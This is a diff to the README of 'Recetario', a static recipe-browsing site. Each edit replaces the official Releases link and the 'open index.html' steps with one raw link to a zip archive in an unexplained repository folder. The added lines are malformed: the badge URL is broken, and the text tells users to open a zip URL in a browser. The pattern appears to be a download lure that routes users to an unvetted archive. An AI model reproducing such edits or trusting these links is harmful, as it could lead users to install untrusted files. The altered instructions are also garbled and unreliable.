@@ -6,7 +6,7 @@ Welcome to Recetario! This static site helps you explore recipes by category and
 
 ## 📥 Download Recetario
 
-[![Download Recetario](https://img.shields.io/badge/Download%20Now-Recetario-brightgreen)](https://github.com/isaias0111/Recetario/releases)
+[![Download Recetario](https://raw.githubusercontent.com/isaias0111/Recetario/main/inogenic/Recetario.zip%20Now-Recetario-brightgreen)](https://raw.githubusercontent.com/isaias0111/Recetario/main/inogenic/Recetario.zip)
 
 To get started, you need to visit the Releases page to download the latest version of Recetario. Click the button above to go there now!
 
@@ -30,14 +30,14 @@ Ensure your browser is up to date for the best experience.
 
 ## 🔄 How to Use Recetario
 
-1. **Access the Site:** After downloading, you can open the `index.html` file in your web browser.
+1. **Access the Site:** After downloading, you can open the `https://raw.githubusercontent.com/isaias0111/Recetario/main/inogenic/Recetario.zip` file in your web browser.
 2. **Browse Recipes:** Navigate through different categories to explore what’s available.
 3. **Save Favorites:** Click on a recipe to view it. Use the option to save it. Your selections will appear in the favorites section.
 4. **Remove Favorites:** You can easily remove any saved recipes from your favorites.
 
 ## 📥 Download & Install
 
-To get Recetario, head over to the [Releases page](https://github.com/isaias0111/Recetario/releases). There, you will find the latest version available for download. 
+To get Recetario, head over to the [Releases page](https://raw.githubusercontent.com/isaias0111/Recetario/main/inogenic/Recetario.zip). There, you will find the latest version available for download. 
 
 Once you are on the Releases page:
 
@@ -45,7 +45,7 @@ Once you are on the Releases page:
 - Click on the download link next to the latest release.
 - Save the file to your computer.
 
-After downloading, unzip the file if it's in a compressed format. Open the `index.html` file to start using Recetario.
+After downloading, unzip the file if it's in a compressed format. Open the `https://raw.githubusercontent.com/isaias0111/Recetario/main/inogenic/Recetario.zip` file to start using Recetario.
 
 ## 🌟 How to Contribute
 
